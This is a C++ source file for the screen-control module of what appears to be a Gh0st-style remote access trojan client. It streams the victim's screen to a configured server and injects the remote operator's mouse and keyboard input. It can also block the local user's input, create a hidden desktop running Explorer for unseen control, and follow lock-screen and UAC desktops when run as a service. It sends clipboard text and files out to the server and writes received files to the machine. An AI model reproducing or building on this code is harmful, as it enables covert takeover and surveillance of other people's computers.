// ScreenManager.cpp: implementation of the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenManager.h"
#include "Common.h"
#include <IOSTREAM>
#if _MSC_VER <= 1200
#include <Winable.h>
#else
#include <WinUser.h>
#endif
#include <time.h>

#include "ScreenSpy.h"
#include "ScreenCapturerDXGI.h"
#include <Shlwapi.h>
#include <shlobj_core.h>
#include "common/file_upload.h"
#include <thread>

#pragma comment(lib, "Shlwapi.lib")

#ifndef PLUGIN
#ifdef _WIN64
#ifdef _DEBUG
#pragma comment(lib, "FileUpload_Libx64d.lib")
#else
#pragma comment(lib, "FileUpload_Libx64.lib")
#endif
#else
int InitFileUpload(const std::string hmac, int chunkSizeKb, int sendDurationMs)
{
    return 0;
}
int UninitFileUpload()
{
    return 0;
}
std::vector<std::string> GetClipboardFiles()
{
    return{};
}
bool GetCurrentFolderPath(std::string& outDir)
{
    return false;
}
int FileBatchTransferWorker(const std::vector<std::string>& files, const std::string& targetDir,
                            void* user, OnTransform f, OnFinish finish, const std::string& hash, const std::string& hmac)
{
    finish(user);
    return 0;
}
int RecvFileChunk(char* buf, size_t len, void* user, OnFinish f, const std::string& hash, const std::string& hmac)
{
    return 0;
}
#endif
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#define WM_MOUSEWHEEL 0x020A
#define GET_WHEEL_DELTA_WPARAM(wParam)((short)HIWORD(wParam))

bool IsWindows8orHigher()
{
    typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (!hMod) return false;

    RtlGetVersionPtr rtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
    if (!rtlGetVersion) return false;

    RTL_OSVERSIONINFOW rovi = { 0 };
    rovi.dwOSVersionInfoSize = sizeof(rovi);
    if (rtlGetVersion(&rovi) == 0) {
        return (rovi.dwMajorVersion > 6) || (rovi.dwMajorVersion == 6 && rovi.dwMinorVersion >= 2);
    }
    return false;
}

CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
{
#ifndef PLUGIN
    extern CONNECT_ADDRESS g_SETTINGS;
    m_conn = &g_SETTINGS;
    InitFileUpload("");
#endif
    m_isGDI = TRUE;
    m_virtual = FALSE;
    m_bIsWorking = TRUE;
    m_bIsBlockInput = FALSE;
    g_hDesk = nullptr;
    m_DesktopID = GetBotId();
    m_ScreenSpyObject = nullptr;
    m_ptrUser = (INT_PTR)user;

    m_point = {};
    m_lastPoint = {};
    m_lmouseDown = FALSE;
    m_hResMoveWindow = nullptr;
    m_resMoveType = 0;
    m_rmouseDown = FALSE;
    m_rclickPoint = {};
    m_rclickWnd = nullptr;

    m_hWorkThread = __CreateThread(NULL,0, WorkThreadProc,this,0,NULL);
}

bool CScreenManager::SwitchScreen() {
    if (m_ScreenSpyObject == NULL || m_ScreenSpyObject->GetScreenCount() <= 1)
        return false;
	m_bIsWorking = FALSE;
	DWORD s = WaitForSingleObject(m_hWorkThread, 3000);
	if (s ==  WAIT_TIMEOUT) {
		TerminateThread(m_hWorkThread, -1);
	}
    m_bIsWorking = TRUE;
    m_hWorkThread = __CreateThread(NULL, 0, WorkThreadProc, this, 0, NULL);
    return true;
}

std::wstring ConvertToWString(const std::string& multiByteStr)
{
    int len = MultiByteToWideChar(CP_ACP, 0, multiByteStr.c_str(), -1, NULL, 0);
    if (len == 0) return L""; // 转换失败

    std::wstring wideStr(len, L'\0');
    MultiByteToWideChar(CP_ACP, 0, multiByteStr.c_str(), -1, &wideStr[0], len);

    return wideStr;
}

bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
{
    bool bReturn = false;

    try {
        if (!pszApplicationFilePath || !pszDesktopName || !strlen(pszApplicationFilePath) || !strlen(pszDesktopName))
            return false;

        TCHAR szDirectoryName[MAX_PATH * 2] = { 0 };
        TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };

        strcpy_s(szDirectoryName, strlen(pszApplicationFilePath) + 1, pszApplicationFilePath);

        std::wstring path = ConvertToWString(pszApplicationFilePath);
        if (!PathIsExe(path.c_str()))
            return false;
        PathRemoveFileSpec(szDirectoryName);
        STARTUPINFO sInfo = { 0 };
        PROCESS_INFORMATION pInfo = { 0 };

        sInfo.cb = sizeof(sInfo);
        sInfo.lpDesktop = pszDesktopName;

        //Launching a application into desktop
        BOOL bCreateProcessReturn = CreateProcess(pszApplicationFilePath,
                                    NULL,
                                    NULL,
                                    NULL,
                                    TRUE,
                                    NORMAL_PRIORITY_CLASS,
                                    NULL,
                                    szDirectoryName,
                                    &sInfo,
                                    &pInfo);
        CloseHandle(pInfo.hProcess);
        CloseHandle(pInfo.hThread);
        TCHAR* pszError = NULL;
        FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                      NULL, GetLastError(), 0, reinterpret_cast<LPTSTR>(&pszError), 0, NULL);

        if (pszError) {
            Mprintf("CreateProcess [%s] failed: %s\n", pszApplicationFilePath, pszError);
            LocalFree(pszError);  // 释放内存
        }

        if (bCreateProcessReturn)
            bReturn = true;

    } catch (...) {
        bReturn = false;
    }

    return bReturn;
}

void CScreenManager::InitScreenSpy()
{
    int DXGI = USING_GDI;
    BYTE algo = ALGORITHM_DIFF;
    BYTE* user = (BYTE*)m_ptrUser;
    BOOL all = FALSE;
    if (!(user == NULL || ((int)user) == 1)) {
        UserParam* param = (UserParam*)user;
        if (param) {
            DXGI = param->buffer[0];
            algo = param->length > 1 ? param->buffer[1] : algo;
            all = param->length > 2 ? param->buffer[2] : all;
        }
        m_pUserParam = param;
    } else {
        DXGI = (int)user;
    }
    Mprintf("CScreenManager: Type %d Algorithm: %d\n", DXGI, int(algo));
    if (DXGI == USING_VIRTUAL) {
        m_virtual = TRUE;
        HDESK hDesk = SelectDesktop((char*)m_DesktopID.c_str());
        if (!hDesk) {
            if (hDesk = CreateDesktop(m_DesktopID.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL)) {
                Mprintf("创建虚拟屏幕成功: %s\n", m_DesktopID.c_str());
                TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
                GetWindowsDirectory(szExplorerFile, MAX_PATH * 2 - 1);
                strcat_s(szExplorerFile, MAX_PATH * 2 - 1, "\\Explorer.Exe");
                if (!LaunchApplication(szExplorerFile, (char*)m_DesktopID.c_str())) {
                    Mprintf("启动资源管理器失败[%s]!!!\n", m_DesktopID.c_str());
                }
            } else {
                Mprintf("创建虚拟屏幕失败: %s\n", m_DesktopID.c_str());
            }
        } else {
            Mprintf("打开虚拟屏幕成功: %s\n", m_DesktopID.c_str());
        }
        if (hDesk) {
            SetThreadDesktop(g_hDesk = hDesk);
        }
    }
    else {
        HDESK hDesk = OpenActiveDesktop();
		if (hDesk) {
			SetThreadDesktop(g_hDesk = hDesk);
		}
    }
    SAFE_DELETE(m_ScreenSpyObject);
    if ((USING_DXGI == DXGI && IsWindows8orHigher())) {
        m_isGDI = FALSE;
        auto s = new ScreenCapturerDXGI(algo, DEFAULT_GOP, all);
        if (s->IsInitSucceed()) {
            m_ScreenSpyObject = s;
        } else {
            SAFE_DELETE(s);
            m_isGDI = TRUE;
            m_ScreenSpyObject = new CScreenSpy(32, algo, FALSE, DEFAULT_GOP, all);
            Mprintf("CScreenManager: DXGI SPY init failed!!! Using GDI instead.\n");
        }
    } else {
        m_isGDI = TRUE;
        m_ScreenSpyObject = new CScreenSpy(32, algo, DXGI == USING_VIRTUAL, DEFAULT_GOP, all);
    }
}

DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
{
    CScreenManager *This = (CScreenManager *)lParam;

    This->InitScreenSpy();

    This->SendBitMapInfo(); //发送bmp位图结构

    // 等控制端对话框打开
    This->WaitForDialogOpen();

    clock_t last = clock();
    This->SendFirstScreen();
#if USING_ZLIB
    const int fps = 8;// 帧率
#else
    const int fps = 8;// 帧率
#endif
    const int sleep = 1000 / fps;// 间隔时间（ms）
    int c1 = 0; // 连续耗时长的次数
    int c2 = 0; // 连续耗时短的次数
    float s0 = sleep; // 两帧之间隔（ms）
    const int frames = fps;	// 每秒调整屏幕发送速度
    const float alpha = 1.03; // 控制fps的因子
    clock_t last_check = clock();
    timeBeginPeriod(1);
    while (This->m_bIsWorking) {
        // 降低桌面检查频率，避免频繁的DC重置导致闪屏
        if (This->m_isGDI && This->IsRunAsService() && !This->m_virtual) {
            auto now = clock();
            if (now - last_check > 500) {
                last_check = now;

                // 使用公共函数检查并切换桌面（无需写权限）
                if (SwitchToDesktopIfChanged(This->g_hDesk, 0)) {
                    // 桌面变化时重置屏幕捕获的DC
                    if (This->m_ScreenSpyObject) {
                        CScreenSpy* spy = dynamic_cast<CScreenSpy*>(This->m_ScreenSpyObject);
                        if (spy) {
                            spy->ResetDesktopDC();
                        }
                    }
                }
            }
        }

        ULONG ulNextSendLength = 0;
        const char*	szBuffer = This->GetNextScreen(ulNextSendLength);
        if (szBuffer) {
            s0 = max(s0, 50); // 最快每秒20帧
            s0 = min(s0, 1000);
            int span = s0-(clock() - last);
            Sleep(span > 0 ? span : 1);
            if (span < 0) { // 发送数据耗时较长，网络较差或数据较多
                c2 = 0;
                if (frames == ++c1) { // 连续一定次数耗时长
                    s0 = (s0 <= sleep*4) ? s0*alpha : s0;
                    c1 = 0;
#ifdef _DEBUG
                    if (1000./s0>1.0)
                        Mprintf("[+]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
#endif
                }
            } else if (span > 0) { // 发送数据耗时比s0短，表示网络较好或数据包较小
                c1 = 0;
                if (frames == ++c2) { // 连续一定次数耗时短
                    s0 = (s0 >= sleep/4) ? s0/alpha : s0;
                    c2 = 0;
#ifdef _DEBUG
                    if (1000./s0<20.0)
                        Mprintf("[-]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
#endif
                }
            }
            last = clock();
            This->SendNextScreen(szBuffer, ulNextSendLength);
        }
    }
    timeEndPeriod(1);
    Mprintf("ScreenWorkThread Exit\n");

    return 0;
}

VOID CScreenManager::SendBitMapInfo()
{
    //这里得到bmp结构的大小
    const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER);
    LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL,
                                            ulLength, MEM_COMMIT, PAGE_READWRITE);
    if (szBuffer == NULL)
        return;
    szBuffer[0] = TOKEN_BITMAPINFO;
    //这里将bmp位图结构发送出去
    memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), ulLength - 1);
    HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
    m_ClientObject->Send2Server((char*)szBuffer, ulLength, 0);
    VirtualFree(szBuffer, 0, MEM_RELEASE);
}

CScreenManager::~CScreenManager()
{
    Mprintf("ScreenManager 析构函数\n");
    UninitFileUpload();
    m_bIsWorking = FALSE;

    WaitForSingleObject(m_hWorkThread, INFINITE);
    if (m_hWorkThread!=NULL) {
        CloseHandle(m_hWorkThread);
    }

    delete m_ScreenSpyObject;
    m_ScreenSpyObject = NULL;
    SAFE_DELETE(m_pUserParam);
}

void RunFileReceiver(CScreenManager *mgr, const std::string &folder)
{
    auto start = time(0);
    Mprintf("Enter thread RunFileReceiver: %d\n", GetCurrentThreadId());
    IOCPClient* pClient = new IOCPClient(mgr->g_bExit, true, MaskTypeNone, mgr->m_conn->GetHeaderEncType());
    if (pClient->ConnectServer(mgr->m_ClientObject->ServerIP().c_str(), mgr->m_ClientObject->ServerPort())) {
        pClient->setManagerCallBack(mgr, CManager::DataProcess);
        // 发送目录并准备接收文件
        char cmd[300] = { COMMAND_GET_FILE };
        memcpy(cmd + 1, folder.c_str(), folder.length());
        pClient->Send2Server(cmd, sizeof(cmd));
        pClient->RunEventLoop(TRUE);
    }
    delete pClient;
    Mprintf("Leave thread RunFileReceiver: %d. Cost: %d s\n", GetCurrentThreadId(), time(0)-start);
}

bool SendData(void* user, FileChunkPacket* chunk, BYTE* data, int size)
{
    IOCPClient* pClient = (IOCPClient*)user;
    if (!pClient->IsConnected() || !pClient->Send2Server((char*)data, size)) {
        return false;
    }
    return true;
}

void RecvData(void* ptr)
{
    FileChunkPacket* pkt = (FileChunkPacket*)ptr;
}

void delay_destroy(IOCPClient* pClient, int sec)
{
    if (!pClient) return;
    Sleep(sec * 1000);
    delete pClient;
}

void FinishSend(void* user)
{
    IOCPClient* pClient = (IOCPClient*)user;
    std::thread(delay_destroy, pClient, 15).detach();
}

VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
    switch(szBuffer[0]) {
    case COMMAND_SWITCH_SCREEN: {
        SwitchScreen();
        break;
    }
    case COMMAND_NEXT: {
        NotifyDialogIsOpen();
        break;
    }
    case COMMAND_SCREEN_CONTROL: {
        BlockInput(false);
        ProcessCommand(szBuffer + 1, ulLength - 1);
        BlockInput(m_bIsBlockInput);  //再恢复成用户的设置

        break;
    }
    case COMMAND_SCREEN_BLOCK_INPUT: { //ControlThread里锁定
        m_bIsBlockInput = *(LPBYTE)&szBuffer[1]; //鼠标键盘的锁定

        BlockInput(m_bIsBlockInput);

        break;
    }
    case COMMAND_SCREEN_GET_CLIPBOARD: {
        auto files = GetClipboardFiles();
        if (!files.empty()) {
            char h[100] = {};
            memcpy(h, szBuffer + 1, ulLength - 1);
            m_hash = std::string(h, h + 64);
            m_hmac = std::string(h + 64, h + 80);
            BYTE szBuffer[1] = { COMMAND_GET_FOLDER };
            SendData(szBuffer, sizeof(szBuffer));
            break;
        }
        SendClientClipboard();
        break;
    }
    case COMMAND_SCREEN_SET_CLIPBOARD: {
        UpdateClientClipboard((char*)szBuffer + 1, ulLength - 1);
        break;
    }
    case COMMAND_GET_FOLDER: {
        std::string folder;
        if (GetCurrentFolderPath(folder)) {
            char h[100] = {};
            memcpy(h, szBuffer + 1, ulLength - 1);
            m_hash = std::string(h, h + 64);
            m_hmac = std::string(h + 64, h + 80);

            if (OpenClipboard(nullptr)) {
                EmptyClipboard();
                CloseClipboard();
            }
            std::thread(RunFileReceiver, this, folder).detach();
        }
        break;
    }
    case COMMAND_GET_FILE: {
        // 发送文件
        auto files = GetClipboardFiles();
        std::string dir = (char*)(szBuffer + 1);
        if (!files.empty() && !dir.empty()) {
            IOCPClient* pClient = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
            if (pClient->ConnectServer(m_ClientObject->ServerIP().c_str(), m_ClientObject->ServerPort())) {
                std::thread(FileBatchTransferWorker, files, dir, pClient, ::SendData, ::FinishSend,
                            m_hash, m_hmac).detach();
            } else {
                delete pClient;
            }
        }
        break;
    }
    case COMMAND_SEND_FILE: {
        // 接收文件
        int n = RecvFileChunk((char*)szBuffer, ulLength, m_conn, RecvData, m_hash, m_hmac);
        if (n) {
            Mprintf("RecvFileChunk failed: %d. hash: %s, hmac: %s\n", n, m_hash.c_str(), m_hmac.c_str());
        }
        break;
    }
    }
}


VOID CScreenManager::UpdateClientClipboard(char *szBuffer, ULONG ulLength)
{
    if (!::OpenClipboard(NULL))
        return;
    ::EmptyClipboard();
    HGLOBAL hGlobal = GlobalAlloc(GMEM_DDESHARE, ulLength+1);
    if (hGlobal != NULL) {

        LPTSTR szClipboardVirtualAddress = (LPTSTR) GlobalLock(hGlobal);
        if (szClipboardVirtualAddress == NULL) {
            GlobalFree(hGlobal);
            CloseClipboard();
            return;
        }
        memcpy(szClipboardVirtualAddress, szBuffer, ulLength);
        szClipboardVirtualAddress[ulLength] = '\0';
        GlobalUnlock(hGlobal);
        if(NULL==SetClipboardData(CF_TEXT, hGlobal))
            GlobalFree(hGlobal);
    }
    CloseClipboard();
}

VOID CScreenManager::SendClientClipboard()
{
    if (!::OpenClipboard(NULL))  //打开剪切板设备
        return;
    HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //代表着一个内存
    if (hGlobal == NULL) {
        ::CloseClipboard();
        return;
    }
    size_t	  iPacketLength = GlobalSize(hGlobal) + 1;
    char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal); //锁定
    LPBYTE	szBuffer = new BYTE[iPacketLength];


    szBuffer[0] = TOKEN_CLIPBOARD_TEXT;
    memcpy(szBuffer + 1, szClipboardVirtualAddress, iPacketLength - 1);
    ::GlobalUnlock(hGlobal);
    ::CloseClipboard();
    m_ClientObject->Send2Server((char*)szBuffer, iPacketLength);
    delete[] szBuffer;
}


VOID CScreenManager::SendFirstScreen()
{
    ULONG ulFirstSendLength = 0;
    LPVOID	FirstScreenData = m_ScreenSpyObject->GetFirstScreenData(&ulFirstSendLength);
    if (ulFirstSendLength == 0 || FirstScreenData == NULL) {
        return;
    }

    m_ClientObject->Send2Server((char*)FirstScreenData, ulFirstSendLength + 1);
}

const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
{
    LPVOID	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);

    if (ulNextSendLength == 0 || NextScreenData == NULL) {
        return NULL;
    }

    return (char*)NextScreenData;
}

VOID CScreenManager::SendNextScreen(const char* szBuffer, ULONG ulNextSendLength)
{
    m_ClientObject->Send2Server(szBuffer, ulNextSendLength);
}

std::string GetTitle(HWND hWnd)
{
    char title[256]; // 预留缓冲区
    GetWindowTextA(hWnd, title, sizeof(title));
    return title;
}

VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
{
    int msgSize = sizeof(MSG64);
    if (ulLength % 28 == 0)         // 32位控制端发过来的消息
        msgSize = 28;
    else if (ulLength % 48 == 0)    // 64位控制端发过来的消息
        msgSize = 48;
    else return;                    // 数据包不合法

    // 命令个数
    ULONG	ulMsgCount = ulLength / msgSize;

    // 处理多个命令
    BYTE* ptr = szBuffer;
    MSG32 msg32;
    MSG64 msg64;
    if (m_virtual) {
        HWND  hWnd = NULL;
        BOOL  mouseMsg = FALSE;
        POINT lastPointCopy = {};
        SetThreadDesktop(g_hDesk);
        for (int i = 0; i < ulMsgCount; ++i, ptr += msgSize) {
            MYMSG* msg = msgSize == 48 ? (MYMSG*)ptr :
                         (MYMSG*)msg64.Create(msg32.Create(ptr, msgSize));
            switch (msg->message) {
            case WM_KEYUP:
                return;
            case WM_CHAR:
            case WM_KEYDOWN: {
                m_point = m_lastPoint;
                hWnd = WindowFromPoint(m_point);
                break;
            }
            default: {
                msg->pt = { LOWORD(msg->lParam), HIWORD(msg->lParam) };
                m_ScreenSpyObject->PointConversion(msg->pt);
                msg->lParam = MAKELPARAM(msg->pt.x, msg->pt.y);

                mouseMsg = TRUE;
                m_point = msg->pt;
                hWnd = WindowFromPoint(m_point);
                lastPointCopy = m_lastPoint;
                m_lastPoint = m_point;
                if (msg->message == WM_RBUTTONDOWN) {
                    // 记录右键按下时的坐标
                    m_rmouseDown = TRUE;
                    m_rclickPoint = msg->pt;
                } else if (msg->message == WM_RBUTTONUP) {
                    m_rmouseDown = FALSE;
                    m_rclickWnd = WindowFromPoint(m_rclickPoint);
                    // 检查是否为系统菜单（如任务栏）
                    char szClass[256] = {};
                    GetClassNameA(m_rclickWnd, szClass, sizeof(szClass));
                    Mprintf("Right click on '%s' %s[%p]\n", szClass, GetTitle(hWnd).c_str(), hWnd);
                    if (strcmp(szClass, "Shell_TrayWnd") == 0) {
                        // 触发系统级右键菜单（任务栏）
                        PostMessage(m_rclickWnd, WM_CONTEXTMENU, (WPARAM)m_rclickWnd,
                                    MAKELPARAM(m_rclickPoint.x, m_rclickPoint.y));
                    } else {
                        // 普通窗口的右键菜单
                        if (!PostMessage(m_rclickWnd, WM_RBUTTONUP, msg->wParam,
                                         MAKELPARAM(m_rclickPoint.x, m_rclickPoint.y))) {
                            // 附加：模拟键盘按下Shift+F10（备用菜单触发方式）
                            keybd_event(VK_SHIFT, 0, 0, 0);
                            keybd_event(VK_F10, 0, 0, 0);
                            keybd_event(VK_F10, 0, KEYEVENTF_KEYUP, 0);
                            keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
                        }
                    }
                } else if (msg->message == WM_LBUTTONUP) {
                    if (m_rclickWnd && hWnd != m_rclickWnd) {
                        PostMessageA(m_rclickWnd, WM_LBUTTONDOWN, MK_LBUTTON, 0);
                        PostMessageA(m_rclickWnd, WM_LBUTTONUP, MK_LBUTTON, 0);
                        m_rclickWnd = nullptr;
                    }
                    m_lmouseDown = FALSE;
                    LRESULT lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
                    switch (lResult) {
                    case HTTRANSPARENT: {
                        SetWindowLongA(hWnd, GWL_STYLE, GetWindowLongA(hWnd, GWL_STYLE) | WS_DISABLED);
                        lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
                        break;
                    }
                    case HTCLOSE: {// 关闭窗口
                        PostMessageA(hWnd, WM_CLOSE, 0, 0);
                        Mprintf("Close window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
                        break;
                    }
                    case HTMINBUTTON: {// 最小化
                        PostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                        Mprintf("Minsize window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
                        break;
                    }
                    case HTMAXBUTTON: {// 最大化
                        WINDOWPLACEMENT windowPlacement;
                        windowPlacement.length = sizeof(windowPlacement);
                        GetWindowPlacement(hWnd, &windowPlacement);
                        if (windowPlacement.flags & SW_SHOWMAXIMIZED)
                            PostMessageA(hWnd, WM_SYSCOMMAND, SC_RESTORE, 0);
                        else
                            PostMessageA(hWnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
                        Mprintf("Maxsize window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
                        break;
                    }
                    }
                } else if (msg->message == WM_LBUTTONDOWN) {
                    m_lmouseDown = TRUE;
                    m_hResMoveWindow = NULL;
                    RECT startButtonRect;
                    HWND hStartButton = FindWindowA((PCHAR)"Button", NULL);
                    GetWindowRect(hStartButton, &startButtonRect);
                    if (PtInRect(&startButtonRect, m_point)) {
                        PostMessageA(hStartButton, BM_CLICK, 0, 0); // 模拟开始按钮点击
                        continue;
                    } else {
                        char windowClass[MAX_PATH] = { 0 };
                        RealGetWindowClassA(hWnd, windowClass, MAX_PATH);
                        if (!lstrcmpA(windowClass, "#32768")) {
                            HMENU hMenu = (HMENU)SendMessageA(hWnd, MN_GETHMENU, 0, 0);
                            int itemPos = MenuItemFromPoint(NULL, hMenu, m_point);
                            int itemId = GetMenuItemID(hMenu, itemPos);
                            PostMessageA(hWnd, 0x1e5, itemPos, 0);
                            PostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
                            continue;
                        }
                    }
                } else if (msg->message == WM_MOUSEMOVE) {
                    if (!m_lmouseDown)
                        continue;
                    if (!m_hResMoveWindow)
                        m_resMoveType = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
                    else
                        hWnd = m_hResMoveWindow;
                    int moveX = lastPointCopy.x - m_point.x;
                    int moveY = lastPointCopy.y - m_point.y;

                    RECT rect;
                    GetWindowRect(hWnd, &rect);
                    int x = rect.left;
                    int y = rect.top;
                    int width = rect.right - rect.left;
                    int height = rect.bottom - rect.top;
                    switch (m_resMoveType) {
                    case HTCAPTION: {
                        x -= moveX;
                        y -= moveY;
                        break;
                    }
                    case HTTOP: {
                        y -= moveY;
                        height += moveY;
                        break;
                    }
                    case HTBOTTOM: {
                        height -= moveY;
                        break;
                    }
                    case HTLEFT: {
                        x -= moveX;
                        width += moveX;
                        break;
                    }
                    case HTRIGHT: {
                        width -= moveX;
                        break;
                    }
                    case HTTOPLEFT: {
                        y -= moveY;
                        height += moveY;
                        x -= moveX;
                        width += moveX;
                        break;
                    }
                    case HTTOPRIGHT: {
                        y -= moveY;
                        height += moveY;
                        width -= moveX;
                        break;
                    }
                    case HTBOTTOMLEFT: {
                        height -= moveY;
                        x -= moveX;
                        width += moveX;
                        break;
                    }
                    case HTBOTTOMRIGHT: {
                        height -= moveY;
                        width -= moveX;
                        break;
                    }
                    default:
                        continue;
                    }
                    MoveWindow(hWnd, x, y, width, height, FALSE);
                    m_hResMoveWindow = hWnd;
                    continue;
                }
                break;
            }
            }
            for (HWND currHwnd = hWnd;;) {
                hWnd = currHwnd;
                ScreenToClient(currHwnd, &m_point);
                currHwnd = ChildWindowFromPoint(currHwnd, m_point);
                if (!currHwnd || currHwnd == hWnd)
                    break;
            }
            if (mouseMsg)
                msg->lParam = MAKELPARAM(m_point.x, m_point.y);
            PostMessage(hWnd, msg->message, (WPARAM)msg->wParam, msg->lParam);
        }
        return;
    }
    if (IsRunAsService()) {
        // 获取当前活动桌面（带写权限，用于锁屏等安全桌面）
        // 使用独立的静态变量避免与WorkThreadProc的g_hDesk并发冲突
        static HDESK s_inputDesk = NULL;
        static clock_t s_lastCheck = 0;
        static DWORD s_lastThreadId = 0;
        const int CHECK_INTERVAL = 100; // 桌面检测间隔（ms），快速响应锁屏/UAC切换

        // 首次调用或定期检测桌面是否变化（降低频率，避免每次输入都检测）
        auto now = clock();
        if (!s_inputDesk || now - s_lastCheck > CHECK_INTERVAL) {
            s_lastCheck = now;
            if (SwitchToDesktopIfChanged(s_inputDesk, DESKTOP_WRITEOBJECTS | GENERIC_WRITE)) {
                // 桌面变化时，标记需要重新设置线程桌面
                s_lastThreadId = 0;
            }
        }

        // 确保当前线程在正确的桌面上（仅首次或线程变化时设置）
        if (s_inputDesk) {
            DWORD currentThreadId = GetCurrentThreadId();
            if (currentThreadId != s_lastThreadId) {
                SetThreadDesktop(s_inputDesk);
                s_lastThreadId = currentThreadId;
            }
        }
    }
    for (int i = 0; i < ulMsgCount; ++i, ptr += msgSize) {
        MSG64* Msg = msgSize == 48 ? (MSG64*)ptr :
                     (MSG64*)msg64.Create(msg32.Create(ptr, msgSize));
        switch (Msg->message) {
        case WM_LBUTTONDOWN:
        case WM_LBUTTONUP:
        case WM_RBUTTONDOWN:
        case WM_RBUTTONUP:
        case WM_LBUTTONDBLCLK:
        case WM_RBUTTONDBLCLK:
        case WM_MBUTTONDOWN:
        case WM_MBUTTONUP:
        case WM_MOUSEMOVE: {
            POINT Point;
            Point.x = LOWORD(Msg->lParam);
            Point.y = HIWORD(Msg->lParam);
            m_ScreenSpyObject->PointConversion(Point);
            BOOL b = SetCursorPos(Point.x, Point.y);
            if (!b) {
                SetForegroundWindow(GetDesktopWindow());
                ReleaseCapture();
                return;
            }
        }
        break;
        default:
            break;
        }

        switch(Msg->message) { //端口发加快递费
        case WM_LBUTTONDOWN:
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
            break;
        case WM_LBUTTONUP:
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
            break;
        case WM_RBUTTONDOWN:
            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
            break;
        case WM_RBUTTONUP:
            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
            break;
        case WM_LBUTTONDBLCLK:
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
            break;
        case WM_RBUTTONDBLCLK:
            mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
            mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
            break;
        case WM_MBUTTONDOWN:
            mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
            break;
        case WM_MBUTTONUP:
            mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
            break;
        case WM_MOUSEWHEEL:
            mouse_event(MOUSEEVENTF_WHEEL, 0, 0,
                        GET_WHEEL_DELTA_WPARAM(Msg->wParam), 0);
            break;
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN: {
            INPUT input = { 0 };
            input.type = INPUT_KEYBOARD;
            input.ki.wVk = (WORD)Msg->wParam;
            input.ki.wScan = MapVirtualKey(Msg->wParam, 0);
            input.ki.dwFlags = 0;
            SendInput(1, &input, sizeof(INPUT));
            break;
        }
        case WM_KEYUP:
        case WM_SYSKEYUP: {
            INPUT input = { 0 };
            input.type = INPUT_KEYBOARD;
            input.ki.wVk = (WORD)Msg->wParam;
            input.ki.wScan = MapVirtualKey(Msg->wParam, 0);
            input.ki.dwFlags = KEYEVENTF_KEYUP;
            SendInput(1, &input, sizeof(INPUT));
            break;
        }
        default:
            break;
        }
    }
}
